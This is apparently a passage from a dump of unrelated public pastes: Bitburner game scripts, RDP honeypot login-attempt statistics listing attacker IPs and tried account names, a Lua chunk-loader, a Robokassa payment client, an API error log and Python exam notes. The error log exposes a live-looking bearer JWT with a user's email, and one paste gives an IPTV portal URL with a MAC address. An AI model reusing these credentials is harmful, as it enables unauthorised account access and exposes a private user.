			ns.write(logfile, ""H "" + ""Hacktime = "" + ght.toLocaleString() + ""\n"", ""a"");
			//ns.write(logfile, ""C "" + ""Call "" + autostart + "": "" + (ns.exec(autostart, node)) + ""\n"", ""a"");
			ns.write(logfile, (""+======================Hack/===================+"" + ""\n""), ""a"");
		}
		//ns.exec(hackscript, node, rwt);
	}
}
3===================================autostart.js/===================================3
4===================================/hacknet.js===================================4
/** @param {NS} ns */
export async function main(ns) {
	function primary() {
		const desiredNodes = 9;
		const desiredLevel = 200;
		const desiredRAM = 64;
		const desiredCore = 16;
		buyNodes(desiredNodes);
		upgradeNodeLevel(desiredLevel);
		upgradeNodeRAM(desiredRAM);
		upgradeCores(desiredCore);
	}
	function buyNodes(numNodes) {
		const ownedNodes = ns.hacknet.numNodes();
		for (let i = 0; i < numNodes; i++) {
			while ((ns.getServerMoneyAvailable(""home"") >= ns.hacknet.getPurchaseNodeCost()) && (ns.hacknet.numNodes() < numNodes)) {
				ns.hacknet.purchaseNode();
				ns.tprint(""Purchased  newnode"")
			}
		}
	}
	function upgradeNodeLevel(targetLevel) {
		const ownedNodes = ns.hacknet.numNodes();
		for (let i = 0; i < ownedNodes; i++) {
			//let nodename = ns.hacknet.getNodeStats(i).name ;
			//let nodelevel = ns.hacknet.getNodeStats(i).level ;
			//let mymoney = ns.getServerMoneyAvailable(""home"") ;
			//let upgrade = ns.hacknet.getLevelUpgradeCost(i, 1) ;
			while (ns.hacknet.getNodeStats(i).level < targetLevel && ns.getServerMoneyAvailable(""home"") >= ns.hacknet.getLevelUpgradeCost(i, 1)) {
				ns.hacknet.upgradeLevel(i, 1);
			}
		}
	}
	function upgradeNodeRAM(targetRAM) {
		const ownedNodes = ns.hacknet.numNodes();
		for (let i = 0; i < ownedNodes; i++) {
			while (ns.hacknet.getNodeStats(i).ram < targetRAM && ns.getServerMoneyAvailable(""home"") >= ns.hacknet.getRamUpgradeCost(i, 1)) {
				ns.hacknet.upgradeRam(i, 1);
				ns.tprint(""Upgraded RAM on "" + ns.hacknet.getNodeStats(i).name + "" to "" + ns.hacknet.getNodeStats(i).ram);
			}
		}
	}
	function upgradeCores(targetCores) {
		const ownedNodes = ns.hacknet.numNodes();
		for (let i = 0; i < ownedNodes; i++) {
			while (ns.hacknet.getNodeStats(i).cores < targetCores && ns.getServerMoneyAvailable(""home"") >= ns.hacknet.getCoreUpgradeCost(i, 1)) {
				ns.hacknet.upgradeCore(i, 1);
				ns.tprint(""Upgraded Cores on "" + ns.hacknet.getNodeStats(i).name + "" to "" + ns.hacknet.getNodeStats(i).cores)
			}
		}
	}
	const numberWithCommas = (number) => {
		return number.toLocaleString();
	};

	while (true) {
		primary();
		let minutes = 5;
		let seconds = minutes * 60;
		let miliseconds = seconds * 1000;
		ns.tprint(numberWithCommas(ns.hacknet.getNodeStats(1).totalProduction));
		await ns.sleep(miliseconds);
	}
	ns.exit();
}
4===================================/hacknet.js===================================4"
JPswi14t,2024-03-16_stats.json,rdp_snitch,JSON,Saturday 16th of March 2024 07:18:08 PM CDT,"{
  ""ip"": {
    ""167.172.216.246"": 12,
    ""68.183.102.140"": 3,
    ""179.60.147.135"": 3,
    ""45.227.254.26"": 12,
    ""58.218.204.183"": 9,
    ""87.251.75.145"": 12,
    ""205.210.31.52"": 9,
    ""194.165.16.37"": 6,
    ""71.6.135.131"": 3,
    ""128.199.73.121"": 564,
    ""87.251.75.64"": 3,
    ""80.66.88.215"": 3,
    ""62.204.41.123"": 18,
    ""103.240.6.155"": 9,
    ""212.70.149.142"": 9,
    ""80.66.76.92"": 9,
    ""185.170.144.3"": 6,
    ""167.71.171.237"": 3,
    ""198.235.24.88"": 9,
    ""5.8.10.202"": 6,
    ""120.240.145.8"": 3,
    ""194.165.16.11"": 6,
    ""152.32.199.33"": 3,
    ""104.248.120.201"": 12,
    ""173.230.147.247"": 3,
    ""205.210.31.161"": 9,
    ""43.226.39.53"": 3828,
    ""185.180.143.8"": 3,
    ""103.77.209.24"": 9,
    ""103.72.57.134"": 9,
    ""118.193.56.171"": 3,
    ""205.210.31.169"": 9,
    ""167.248.133.50"": 3,
    ""45.227.254.48"": 6
  },
  ""asn"": {
    ""AS14061"": 594,
    ""AS209588"": 3,
    ""AS267784"": 18,
    ""AS4134"": 9,
    ""AS208091"": 27,
    ""AS396982"": 36,
    ""AS48721"": 12,
    ""AS10439"": 3,
    ""AS59425"": 18,
    ""AS151853"": 9,
    ""AS204428"": 9,
    ""AS197414"": 6,
    ""AS34665"": 6,
    ""AS56040"": 3,
    ""AS135377"": 6,
    ""AS63949"": 3,
    ""AS134762"": 3828,
    ""AS211680"": 3,
    ""AS150897"": 9,
    ""AS150892"": 9,
    ""AS398324"": 3
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 594,
    ""Flyservers S.A."": 33,
    ""Chinanet"": 9,
    ""Xhost Internet Solutions LP"": 30,
    ""Google LLC"": 36,
    ""CariNet, Inc."": 3,
    ""Xhost Internet Solutions"": 3,
    ""Horizon LLC"": 18,
    ""Giza Network Limited"": 9,
    ""SS-Net"": 9,
    ""Petersburg Internet Network ltd"": 6,
    ""China Mobile communications corporation"": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 6,
    ""Akamai Technologies, Inc."": 3,
    ""CHINANET Liaoning province Dalian MAN network"": 3828,
    ""NSEC - Sistemas Informaticos, S.A."": 3,
    ""Azplay Technology Company Limited"": 9,
    ""Gold VPS Limited"": 9,
    ""Censys, Inc."": 3
  },
  ""org"": {
    ""DigitalOcean, LLC"": 594,
    ""Cloud Solutions S.A"": 3,
    ""UAB Host Baltic"": 18,
    ""Chinanet JS"": 9,
    ""Xhost Internet Solutions"": 24,
    ""Palo Alto Networks, Inc"": 36,
    ""Flyservers S.A"": 12,
    ""CariNet, Inc."": 3,
    ""XHOSTIS"": 3,
    ""Horizon LLC"": 18,
    ""Giza Network Limited"": 9,
    ""4Media Ltd"": 9,
    ""Xhostis"": 6,
    ""PIN DC"": 6,
    ""China Mobile"": 3,
    ""Ucloud Information Technology (hk) Limited"": 6,
    ""Linode"": 3,
    ""Shenzhen Qianhai bird cloud computing Co. Ltd."": 3828,
    ""ICG 1 Inap"": 3,
    ""Azplay Technology Company Limited"": 9,
    ""Gold VPS Limited"": 9,
    ""Censys, Inc."": 3
  },
  ""regionName"": {
    ""California"": 54,
    ""New Jersey"": 18,
    ""Distrito Federal"": 3,
    ""Vilnius"": 18,
    ""Jiangsu"": 9,
    ""North Holland"": 30,
    ""Kaunas"": 12,
    ""South West"": 564,
    ""Drenthe"": 3,
    ""Moscow"": 18,
    ""Ho Chi Minh"": 18,
    ""Plovdiv"": 9,
    ""St.-Petersburg"": 6,
    ""Guangdong"": 3831,
    ""Sao Paulo"": 3,
    ""Illinois"": 3,
    ""\u00ecnh \u0110\u1ecbnh Province"": 9,
    ""Bangkok"": 3,
    ""Michigan"": 3
  },
  ""country"": {
    ""United States"": 78,
    ""Venezuela"": 3,
    ""Lithuania"": 30,
    ""China"": 3840,
    ""The Netherlands"": 33,
    ""Singapore"": 564,
    ""Russia"": 24,
    ""Vietnam"": 27,
    ""Bulgaria"": 9,
    ""Brazil"": 3,
    ""Thailand"": 3
  },
  ""account"": {
    ""w63prjqz"": 12,
    ""beio"": 6,
    ""Administr"": 45,
    ""Test"": 42,
    ""hello"": 36,
    ""PEpwDPiRn"": 3,
    ""HNsRje"": 3,
    ""rijVSr"": 3,
    ""root"": 3,
    ""Administrator"": 147,
    ""Admin"": 141,
    ""Whatuptime.com"": 141,
    ""Jakartakini123#"": 141,
    ""BezEuJR"": 3,
    ""OuSShzXWF"": 3,
    ""wgwlll"": 3,
    ""ZgHhAE"": 3,
    ""(empty)"": 12,
    ""Domain"": 6,
    ""5444kna1"": 12,
    ""IcNXJdVkd"": 3,
    ""WqyynP"": 3,
    ""lITtpY"": 3,
    ""NCRACK_USER"": 3828,
    ""6fr5moe1"": 3,
    ""mRagpMaAJ"": 3,
    ""qhDJGk"": 3,
    ""PCvtYS"": 3
  },
  ""keyboard"": {
    ""Unknown"": 4614
  },
  ""client_build"": {
    ""Unknown"": 4614
  },
  ""client_name"": {
    ""Unknown"": 4614
  },
  ""ip_type"": {
    ""hosting & proxy"": 15,
    ""Unknown"": 3969,
    ""hosting"": 627,
    ""mobile"": 3
  }
}"
EFjFHTmN,2024-03-16_stats.json,rdp_snitch,JSON,Saturday 16th of March 2024 07:16:09 PM CDT,"{
  ""ip"": {
    ""167.172.216.246"": 8,
    ""68.183.102.140"": 2,
    ""179.60.147.135"": 2,
    ""45.227.254.26"": 8,
    ""58.218.204.183"": 6,
    ""87.251.75.145"": 8,
    ""205.210.31.52"": 6,
    ""194.165.16.37"": 4,
    ""71.6.135.131"": 2,
    ""128.199.73.121"": 376,
    ""87.251.75.64"": 2,
    ""80.66.88.215"": 2,
    ""62.204.41.123"": 12,
    ""103.240.6.155"": 6,
    ""212.70.149.142"": 6,
    ""80.66.76.92"": 6,
    ""185.170.144.3"": 4,
    ""167.71.171.237"": 2,
    ""198.235.24.88"": 6,
    ""5.8.10.202"": 4,
    ""120.240.145.8"": 2,
    ""194.165.16.11"": 4,
    ""152.32.199.33"": 2,
    ""104.248.120.201"": 8,
    ""173.230.147.247"": 2,
    ""205.210.31.161"": 6,
    ""43.226.39.53"": 2552,
    ""185.180.143.8"": 2,
    ""103.77.209.24"": 6,
    ""103.72.57.134"": 6,
    ""118.193.56.171"": 2,
    ""205.210.31.169"": 6,
    ""167.248.133.50"": 2,
    ""45.227.254.48"": 4
  },
  ""asn"": {
    ""AS14061"": 396,
    ""AS209588"": 2,
    ""AS267784"": 12,
    ""AS4134"": 6,
    ""AS208091"": 18,
    ""AS396982"": 24,
    ""AS48721"": 8,
    ""AS10439"": 2,
    ""AS59425"": 12,
    ""AS151853"": 6,
    ""AS204428"": 6,
    ""AS197414"": 4,
    ""AS34665"": 4,
    ""AS56040"": 2,
    ""AS135377"": 4,
    ""AS63949"": 2,
    ""AS134762"": 2552,
    ""AS211680"": 2,
    ""AS150897"": 6,
    ""AS150892"": 6,
    ""AS398324"": 2
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 396,
    ""Flyservers S.A."": 22,
    ""Chinanet"": 6,
    ""Xhost Internet Solutions LP"": 20,
    ""Google LLC"": 24,
    ""CariNet, Inc."": 2,
    ""Xhost Internet Solutions"": 2,
    ""Horizon LLC"": 12,
    ""Giza Network Limited"": 6,
    ""SS-Net"": 6,
    ""Petersburg Internet Network ltd"": 4,
    ""China Mobile communications corporation"": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 4,
    ""Akamai Technologies, Inc."": 2,
    ""CHINANET Liaoning province Dalian MAN network"": 2552,
    ""NSEC - Sistemas Informaticos, S.A."": 2,
    ""Azplay Technology Company Limited"": 6,
    ""Gold VPS Limited"": 6,
    ""Censys, Inc."": 2
  },
  ""org"": {
    ""DigitalOcean, LLC"": 396,
    ""Cloud Solutions S.A"": 2,
    ""UAB Host Baltic"": 12,
    ""Chinanet JS"": 6,
    ""Xhost Internet Solutions"": 16,
    ""Palo Alto Networks, Inc"": 24,
    ""Flyservers S.A"": 8,
    ""CariNet, Inc."": 2,
    ""XHOSTIS"": 2,
    ""Horizon LLC"": 12,
    ""Giza Network Limited"": 6,
    ""4Media Ltd"": 6,
    ""Xhostis"": 4,
    ""PIN DC"": 4,
    ""China Mobile"": 2,
    ""Ucloud Information Technology (hk) Limited"": 4,
    ""Linode"": 2,
    ""Shenzhen Qianhai bird cloud computing Co. Ltd."": 2552,
    ""ICG 1 Inap"": 2,
    ""Azplay Technology Company Limited"": 6,
    ""Gold VPS Limited"": 6,
    ""Censys, Inc."": 2
  },
  ""regionName"": {
    ""California"": 36,
    ""New Jersey"": 12,
    ""Distrito Federal"": 2,
    ""Vilnius"": 12,
    ""Jiangsu"": 6,
    ""North Holland"": 20,
    ""Kaunas"": 8,
    ""South West"": 376,
    ""Drenthe"": 2,
    ""Moscow"": 12,
    ""Ho Chi Minh"": 12,
    ""Plovdiv"": 6,
    ""St.-Petersburg"": 4,
    ""Guangdong"": 2554,
    ""Sao Paulo"": 2,
    ""Illinois"": 2,
    ""\u00ecnh \u0110\u1ecbnh Province"": 6,
    ""Bangkok"": 2,
    ""Michigan"": 2
  },
  ""country"": {
    ""United States"": 52,
    ""Venezuela"": 2,
    ""Lithuania"": 20,
    ""China"": 2560,
    ""The Netherlands"": 22,
    ""Singapore"": 376,
    ""Russia"": 16,
    ""Vietnam"": 18,
    ""Bulgaria"": 6,
    ""Brazil"": 2,
    ""Thailand"": 2
  },
  ""account"": {
    ""w63prjqz"": 8,
    ""beio"": 4,
    ""Administr"": 30,
    ""Test"": 28,
    ""hello"": 24,
    ""PEpwDPiRn"": 2,
    ""HNsRje"": 2,
    ""rijVSr"": 2,
    ""root"": 2,
    ""Administrator"": 98,
    ""Admin"": 94,
    ""Whatuptime.com"": 94,
    ""Jakartakini123#"": 94,
    ""BezEuJR"": 2,
    ""OuSShzXWF"": 2,
    ""wgwlll"": 2,
    ""ZgHhAE"": 2,
    ""(empty)"": 8,
    ""Domain"": 4,
    ""5444kna1"": 8,
    ""IcNXJdVkd"": 2,
    ""WqyynP"": 2,
    ""lITtpY"": 2,
    ""NCRACK_USER"": 2552,
    ""6fr5moe1"": 2,
    ""mRagpMaAJ"": 2,
    ""qhDJGk"": 2,
    ""PCvtYS"": 2
  },
  ""keyboard"": {
    ""Unknown"": 3076
  },
  ""client_build"": {
    ""Unknown"": 3076
  },
  ""client_name"": {
    ""Unknown"": 3076
  },
  ""ip_type"": {
    ""hosting & proxy"": 10,
    ""Unknown"": 2646,
    ""hosting"": 418,
    ""mobile"": 2
  }
}"
yCMEC583,2024-03-16_stats.json,rdp_snitch,JSON,Saturday 16th of March 2024 07:15:08 PM CDT,"{
  ""ip"": {
    ""167.172.216.246"": 4,
    ""68.183.102.140"": 1,
    ""179.60.147.135"": 1,
    ""45.227.254.26"": 4,
    ""58.218.204.183"": 3,
    ""87.251.75.145"": 4,
    ""205.210.31.52"": 3,
    ""194.165.16.37"": 2,
    ""71.6.135.131"": 1,
    ""128.199.73.121"": 188,
    ""87.251.75.64"": 1,
    ""80.66.88.215"": 1,
    ""62.204.41.123"": 6,
    ""103.240.6.155"": 3,
    ""212.70.149.142"": 3,
    ""80.66.76.92"": 3,
    ""185.170.144.3"": 2,
    ""167.71.171.237"": 1,
    ""198.235.24.88"": 3,
    ""5.8.10.202"": 2,
    ""120.240.145.8"": 1,
    ""194.165.16.11"": 2,
    ""152.32.199.33"": 1,
    ""104.248.120.201"": 4,
    ""173.230.147.247"": 1,
    ""205.210.31.161"": 3,
    ""43.226.39.53"": 1276,
    ""185.180.143.8"": 1,
    ""103.77.209.24"": 3,
    ""103.72.57.134"": 3,
    ""118.193.56.171"": 1,
    ""205.210.31.169"": 3,
    ""167.248.133.50"": 1,
    ""45.227.254.48"": 2
  },
  ""asn"": {
    ""AS14061"": 198,
    ""AS209588"": 1,
    ""AS267784"": 6,
    ""AS4134"": 3,
    ""AS208091"": 9,
    ""AS396982"": 12,
    ""AS48721"": 4,
    ""AS10439"": 1,
    ""AS59425"": 6,
    ""AS151853"": 3,
    ""AS204428"": 3,
    ""AS197414"": 2,
    ""AS34665"": 2,
    ""AS56040"": 1,
    ""AS135377"": 2,
    ""AS63949"": 1,
    ""AS134762"": 1276,
    ""AS211680"": 1,
    ""AS150897"": 3,
    ""AS150892"": 3,
    ""AS398324"": 1
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 198,
    ""Flyservers S.A."": 11,
    ""Chinanet"": 3,
    ""Xhost Internet Solutions LP"": 10,
    ""Google LLC"": 12,
    ""CariNet, Inc."": 1,
    ""Xhost Internet Solutions"": 1,
    ""Horizon LLC"": 6,
    ""Giza Network Limited"": 3,
    ""SS-Net"": 3,
    ""Petersburg Internet Network ltd"": 2,
    ""China Mobile communications corporation"": 1,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Akamai Technologies, Inc."": 1,
    ""CHINANET Liaoning province Dalian MAN network"": 1276,
    ""NSEC - Sistemas Informaticos, S.A."": 1,
    ""Azplay Technology Company Limited"": 3,
    ""Gold VPS Limited"": 3,
    ""Censys, Inc."": 1
  },
  ""org"": {
    ""DigitalOcean, LLC"": 198,
    ""Cloud Solutions S.A"": 1,
    ""UAB Host Baltic"": 6,
    ""Chinanet JS"": 3,
    ""Xhost Internet Solutions"": 8,
    ""Palo Alto Networks, Inc"": 12,
    ""Flyservers S.A"": 4,
    ""CariNet, Inc."": 1,
    ""XHOSTIS"": 1,
    ""Horizon LLC"": 6,
    ""Giza Network Limited"": 3,
    ""4Media Ltd"": 3,
    ""Xhostis"": 2,
    ""PIN DC"": 2,
    ""China Mobile"": 1,
    ""Ucloud Information Technology (hk) Limited"": 2,
    ""Linode"": 1,
    ""Shenzhen Qianhai bird cloud computing Co. Ltd."": 1276,
    ""ICG 1 Inap"": 1,
    ""Azplay Technology Company Limited"": 3,
    ""Gold VPS Limited"": 3,
    ""Censys, Inc."": 1
  },
  ""regionName"": {
    ""California"": 18,
    ""New Jersey"": 6,
    ""Distrito Federal"": 1,
    ""Vilnius"": 6,
    ""Jiangsu"": 3,
    ""North Holland"": 10,
    ""Kaunas"": 4,
    ""South West"": 188,
    ""Drenthe"": 1,
    ""Moscow"": 6,
    ""Ho Chi Minh"": 6,
    ""Plovdiv"": 3,
    ""St.-Petersburg"": 2,
    ""Guangdong"": 1277,
    ""Sao Paulo"": 1,
    ""Illinois"": 1,
    ""\u00ecnh \u0110\u1ecbnh Province"": 3,
    ""Bangkok"": 1,
    ""Michigan"": 1
  },
  ""country"": {
    ""United States"": 26,
    ""Venezuela"": 1,
    ""Lithuania"": 10,
    ""China"": 1280,
    ""The Netherlands"": 11,
    ""Singapore"": 188,
    ""Russia"": 8,
    ""Vietnam"": 9,
    ""Bulgaria"": 3,
    ""Brazil"": 1,
    ""Thailand"": 1
  },
  ""account"": {
    ""w63prjqz"": 4,
    ""beio"": 2,
    ""Administr"": 15,
    ""Test"": 14,
    ""hello"": 12,
    ""PEpwDPiRn"": 1,
    ""HNsRje"": 1,
    ""rijVSr"": 1,
    ""root"": 1,
    ""Administrator"": 49,
    ""Admin"": 47,
    ""Whatuptime.com"": 47,
    ""Jakartakini123#"": 47,
    ""BezEuJR"": 1,
    ""OuSShzXWF"": 1,
    ""wgwlll"": 1,
    ""ZgHhAE"": 1,
    ""(empty)"": 4,
    ""Domain"": 2,
    ""5444kna1"": 4,
    ""IcNXJdVkd"": 1,
    ""WqyynP"": 1,
    ""lITtpY"": 1,
    ""NCRACK_USER"": 1276,
    ""6fr5moe1"": 1,
    ""mRagpMaAJ"": 1,
    ""qhDJGk"": 1,
    ""PCvtYS"": 1
  },
  ""keyboard"": {
    ""Unknown"": 1538
  },
  ""client_build"": {
    ""Unknown"": 1538
  },
  ""client_name"": {
    ""Unknown"": 1538
  },
  ""ip_type"": {
    ""hosting & proxy"": 5,
    ""Unknown"": 1323,
    ""hosting"": 209,
    ""mobile"": 1
  }
}"
rf5zLc9V,chunkloader,Zeehao,Lua,Saturday 16th of March 2024 07:06:23 PM CDT,"local component = require(""component"")
local event = require(""event"")

os.execute(""clear"")

local cl = component.chunkerloader
cl.setActive(true)
while event.pull(1, ""interrupted"")  == nil do 
    print(""Is Active: "" .. tostring(cl.isActive()))
    if cl.isActive() == false then
        os.execute(""reboot"")
    end
end"
3ZqhbFCE,Untitled,arbora,TypeScript,Saturday 16th of March 2024 06:13:46 PM CDT,"import { createHash } from 'crypto'
import axios from 'axios'
import { ICreateRoboxCheckoutRequest } from '@luaroxa/contracts'
import RoboxWebhook from './robox.webhook.dto'

type RoboxConfig = {
  shopIdentifier: string
  password1: string
  password2: string
  testMode: boolean
}

export default class Robokaska {
  private shopIdentifier: string
  private password1: string
  private password2: string
  private testMode: boolean

  constructor(config: RoboxConfig) {
    const { shopIdentifier, password1, password2, testMode = false } = config

    this.shopIdentifier = shopIdentifier
    this.password1 = password1
    this.password2 = password2
    this.testMode = testMode
  }

  md5(input: string) {
    return createHash('md5').update(input).digest('hex')
  }

  async createPayUrl(dto: ICreateRoboxCheckoutRequest): Promise<{
    id: string
    url: string
  }> {
    const InvId = ''

    const signature = this.md5(
      `${this.shopIdentifier}:${dto.amount}:${InvId}:${this.password1}:Shp_id=${dto.checkoutId}`,
    )

    const payload = {
      MerchantLogin: this.shopIdentifier,
      OutSum: dto.amount.toString(),
      InvId,
      Shp_id: dto.checkoutId,
      SignatureValue: signature,
    }

    const url = 'https://auth.robokassa.ru/Merchant/Indexjson.aspx?'

    const response = await axios.post(
      url,
      new URLSearchParams(payload).toString(),
      {
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      },
    )
    console.log('response.data', response.data)
    if (response.data.error) {
      throw new Error(JSON.stringify(response.data.error))
    }
    return {
      id: response.data.invoiceID,
      url: `https://auth.robokassa.ru/Merchant/Index/${response.data.invoiceID}`,
    }
  }

  checkPay(dto: RoboxWebhook) {
    // const sigSrc = `${Math.round(parseInt(dto.OutSum))}:${dto.InvId}:${this.password2}:Shp_id=${dto.Shp_id}`
    // const sigSrc = `${dto.OutSum}:${dto.InvId}:${this.password2}:Shp_id=${dto.Shp_id}`
    // const sigSrc = `${dto.OutSum}::${this.password2}:Shp_id=${dto.Shp_id}`
    // const sigSrc = `${dto.OutSum}:${dto.InvId}:${this.password2}`
    const sigSrc = `${dto.OutSum}:${dto.InvId}:${this.password2}:Shp_id=${dto.Shp_id}`
    const sig = this.md5(sigSrc)

    console.debug('checkPay', dto)
    console.debug('checkPay to md5', sigSrc)
    console.debug('checkPay: compare', dto.SignatureValue.toUpperCase(), sig)

    return dto.SignatureValue.toUpperCase() === sig.toUpperCase()
  }
}
"
4zYA4dJG,Error on setting change,iko1133,JSON,Saturday 16th of March 2024 05:50:57 PM CDT,"{
	""config"": {
		""adapter"": [""xhr"", ""http""],
		""baseURL"": ""https://devheyeyapi.azurewebsites.net/api/"",
		""data"": ""{\""settingId\"":1,\""value\"":\""false\""}"",
		""env"": {
			""Blob"": [Function Blob],
			""FormData"": [Function FormData]
		},
		""headers"": [Object],
		""maxBodyLength"": -1,
		""maxContentLength"": -1,
		""method"": ""put"",
		""timeout"": 0,
		""transformRequest"": [
			[Function transformRequest]
		],
		""transformResponse"": [
			[Function transformResponse]
		],
		""transitional"": {
			""clarifyTimeoutError"": false,
			""forcedJSONParsing"": true,
			""silentJSONParsing"": true
		},
		""url"": ""users/10/settings/1"",
		""validateStatus"": [Function validateStatus],
		""xsrfCookieName"": ""XSRF-TOKEN"",
		""xsrfHeaderName"": ""X-XSRF-TOKEN""
	},
	""data"": {
		""Message"": ""The property 'UserSetting.UserId' is part of a key and so cannot be modified or marked as modified. To change the principal of an existing entity with an identifying foreign key, first delete the dependent and invoke 'SaveChanges', and then associate the dependent with the new principal."",
		""StatusCode"": 500
	},
	""headers"": {
		""cache-control"": ""no-cache,no-store"",
		""content-type"": ""application/json"",
		""date"": ""Sat, 16 Mar 2024 22:19:08 GMT"",
		""expires"": ""-1"",
		""pragma"": ""no-cache"",
		""server"": ""Microsoft-IIS/10.0"",
		""x-powered-by"": ""ASP.NET""
	},
	""request"": {
		""DONE"": 4,
		""HEADERS_RECEIVED"": 2,
		""LOADING"": 3,
		""OPENED"": 1,
		""UNSENT"": 0,
		""_aborted"": false,
		""_cachedResponse"": undefined,
		""_hasError"": false,
		""_headers"": {
			""accept"": ""application/json"",
			""authorization"": ""Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6ImViYzIwNzkzNTQ1NzExODNkNzFjZWJlZDI5YzU1YmVmMjdhZDJjY2IiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL3NlY3VyZXRva2VuLmdvb2dsZS5jb20vZGV2aGV5ZXkiLCJhdWQiOiJkZXZoZXlleSIsImF1dGhfdGltZSI6MTcwOTkwODU1NiwidXNlcl9pZCI6IldLQUpreFQwV0tkQkdlZmRFU3F4NTdQNVNmYjIiLCJzdWIiOiJXS0FKa3hUMFdLZEJHZWZkRVNxeDU3UDVTZmIyIiwiaWF0IjoxNzEwNjI1MDQ2LCJleHAiOjE3MTA2Mjg2NDYsImVtYWlsIjoiZGVtbzIwQGdtYWlsLmNvbSIsImVtYWlsX3ZlcmlmaWVkIjpmYWxzZSwiZmlyZWJhc2UiOnsiaWRlbnRpdGllcyI6eyJlbWFpbCI6WyJkZW1vMjBAZ21haWwuY29tIl19LCJzaWduX2luX3Byb3ZpZGVyIjoicGFzc3dvcmQifX0.N75rCFV3RXistg6yaxAf4Tb4WFpj93vUE1gVvZmr5MKRdOkZ-LoRbQm0OhDq1FPpXAQ8QqdpnOpTZfyrHQlm3gmY4UeXxYsLFyo6M4w9ToMMH1idRdS80ESJWlkstUmhOb3xDgKtC1HL5PrLqWdpgYY90CTGhHy7reaxrmxHJvRov1IUIXm3hqY7ziPDALbm6WOJSARYtF_IyOy1edylfDLAH_rkYjqNNc6dpziKsOtyF7-gaelnRTvgqRxdSBbl7W2tTYhhyhIVOV-zD-2bfoX_pOYRPVJnrGpYwnai5fgyoWQ1QVpLfkOKWnB7ZmI5p7ETZ9bmdk9LdwkZ33EWmQ"",
			""content-type"": ""application/json-patch+json"",
			""x-requested-with"": ""XMLHttpRequest""
		},
		""_incrementalEvents"": false,
		""_lowerCaseResponseHeaders"": {
			""cache-control"": ""no-cache,no-store"",
			""content-type"": ""application/json"",
			""date"": ""Sat, 16 Mar 2024 22:19:08 GMT"",
			""expires"": ""-1"",
			""pragma"": ""no-cache"",
			""server"": ""Microsoft-IIS/10.0"",
			""x-powered-by"": ""ASP.NET""
		},
		""_method"": ""PUT"",
		""_perfKey"": ""network_XMLHttpRequest_https://devheyeyapi.azurewebsites.net/api/users/10/settings/1"",
		""_performanceLogger"": {
			""_closed"": false,
			""_extras"": [Object],
			""_pointExtras"": [Object],
			""_points"": [Object],
			""_timespans"": [Object]
		},
		""_requestId"": null,
		""_response"": ""{\""StatusCode\"":500,\""Message\"":\""The property \\u0027UserSetting.UserId\\u0027 is part of a key and so cannot be modified or marked as modified. To change the principal of an existing entity with an identifying foreign key, first delete the dependent and invoke \\u0027SaveChanges\\u0027, and then associate the dependent with the new principal.\""}"",
		""_responseType"": """",
		""_sent"": true,
		""_subscriptions"": [],
		""_timedOut"": false,
		""_trackingName"": ""unknown"",
		""_url"": ""https://devheyeyapi.azurewebsites.net/api/users/10/settings/1"",
		""readyState"": 4,
		""responseHeaders"": {
			""Cache-Control"": ""no-cache,no-store"",
			""Content-Type"": ""application/json"",
			""Date"": ""Sat, 16 Mar 2024 22:19:08 GMT"",
			""Expires"": ""-1"",
			""Pragma"": ""no-cache"",
			""Server"": ""Microsoft-IIS/10.0"",
			""x-powered-by"": ""ASP.NET""
		},
		""responseURL"": ""https://devheyeyapi.azurewebsites.net/api/users/10/settings/1"",
		""status"": 500,
		""timeout"": 0,
		""upload"": {},
		""withCredentials"": true
	},
	""status"": 500,
	""statusText"": undefined
}"
Ca17NVqG,PORTAL-FLIXTVON,brunoflix,XML,Saturday 16th of March 2024 05:44:29 PM CDT,"portal""http://4u.eagle4u.org:8080/""
00:1A:79:03:1E:30"
u1jAnUjB,webinar-exam-review-v4-2023-03-16,jspill,Python,Saturday 16th of March 2024 05:19:06 PM CDT,"# Exam Review 2024 Mar 16

# Do those LABS
# Ch 2-14... all Labs!
# Ch 21-32 just ADDITIONAL LABS, but important practice!
# get to know the Prac Tests, Ch 33 and 34... more than the Pre

# Use Submit Mode and get them to 100%!!!
# PAY ATTENTION to the unit tests!
# ... then UNIT TEST more! Unit test, unit test, unit test!

# When you've gotten the Ch 33-34 Prac Tests to 100, go back and do each again.
# This time, try to think of 2-3 more unit tests that could be run on each question.

# Comp 1: Basic syntax and knowledge: operators, data types, etc
# Comp 2: Control Flow
# Comp 3: Modules and Files

# Comp 1: Basic syntax and knowledge: operators, data types, etc
# Operators
# = # assignment
# == # asking a question
# +
# -
# *
# /
# % # modulo... whole number remainder... ""how many whole things didn't fit since the last even division?""
# // # floor division... last even division
# <
# >
# <=
# >=
# += # x += 1 --> x = x+1
# -=
# ** # pow(), math.pow()
# !=
# # keywords
# in # membership check... if x in myList:
# not # if not x in myList:
# and
# or # any one True would cause the combo is True... limit OR to 2-3 conditions

# Data Types/Classes
# int
# float
# bool
# str # """"
# list # [ ]
# dict # {key: value}, review Ch 4.5
# tuple # ( ) immutable, Python sees x,y,z as (x,y,z) -> return a,b,c --> return (a,b,c)
# set # {x,y,z} no duplicates, no order --> no indices, can't slice it, can't sort it, can't reverse it
# range # range()... container of consecutive numbers
# file # open()... f.read(), f.readlines(), f.write()

# Comp 2
# Control Flow! The how and when of our programs
# IF statements... if, if/else, if/elif, if/elif/else
# LOOPS
# WHILE - a general purpose loop, an IF that repeats
# FOR - repeating action once for everything in a container
# FOR - repeating actions a known number of times -> once for everything in a container
# Check out my For Loops webinar in The Gotchas
# for ___ in _someContainer_:
# for item in myList:
# for char in myStr:
# for key in myDict: # value for that key in myDict[key]
# for n in range(5):
# for i in range(0, len(myList)):
# for i, item in enumerate(myList):

# FUNCTIONS
# defining/writing a function vs calling it
# modular... a function has ONE job
# output/print vs return (or maybe something)
# parameters are special variables for holding stuff coming into the function
# parameters vs arguments
#
# def someFunction(x, y):
#     return x ** y
#
# if __name__ == ""__main__"": # is this script the one that's running now
#     input1 = int(input())
#     input2 = int(input())
#     myNum = someFunction(input1, input2)
#     print(myNum)

# final ""task"" page of Ch 10, 11, 13, 14
# CodingBat also has good function-based Python questions:
# https://codingbat.com/python

# BUILT-IN FUNCTIONS
# input()
# print()
